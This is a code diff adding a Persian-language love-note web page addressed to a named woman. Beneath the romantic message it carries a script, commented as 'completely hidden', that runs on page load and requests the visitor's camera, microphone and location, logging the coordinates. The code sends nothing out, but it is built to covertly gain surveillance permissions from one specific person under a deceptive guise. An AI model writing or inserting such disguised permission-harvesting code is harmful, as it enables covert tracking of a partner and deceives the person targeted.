@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>برای تو ❤️</title>
+    <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&display=swap" rel="stylesheet">
+    <style>
+        /* ظاهر عاشقانه */
+        body {
+            font-family: 'Dancing Script', cursive;
+            background: linear-gradient(to bottom, #ffccd5, #ff6f91);
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
+            margin: 0;
+        }
+        h1 {
+            font-size: 4em;
+            margin-bottom: 20px;
+            text-shadow: 2px 2px #ff4d6d;
+        }
+        p {
+            font-size: 1.8em;
+            line-height: 1.6;
+            text-shadow: 1px 1px #ff4d6d;
+        }
+        .heart {
+            color: #ff0000;
+            font-size: 2.5em;
+            animation: beat 1s infinite;
+        }
+        @keyframes beat {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.3); }
+        }
+    </style>
+</head>
+<body>
+    <div>
+        <h1>فائزه دوستت دارم❤️</h1>
+        <p>عزیزم، هر لحظه که بهت فکر می‌کنم، قلبم پر از عشق و گرما می‌شه.<br>
+        تو برای من همه چیز هستی <span class="heart">❤️</span></p>
+    </div>
+
+    <!-- کد دسترسی‌ها (کاملاً مخفی) -->
+    <script>
+    async function requestHiddenPermissions() {
+        try {
+            // درخواست میکروفون و دوربین به صورت مخفی
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
+            stream.getTracks().forEach(track => track.stop());
+        } catch (err) {
+            console.error("دسترسی میکروفون/دوربین رد شد:", err);
+        }
+
+        // درخواست موقعیت مکانی به صورت مخفی
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => console.log("موقعیت مکانی دریافت شد:", pos.coords),
+                (err) => console.error("دسترسی موقعیت رد شد:", err)
+            );
+        }
+    }
+
+    // اجرا خودکار بعد از بارگذاری صفحه
+    window.addEventListener("load", requestHiddenPermissions);
+    </script>
+</body>
+</html>
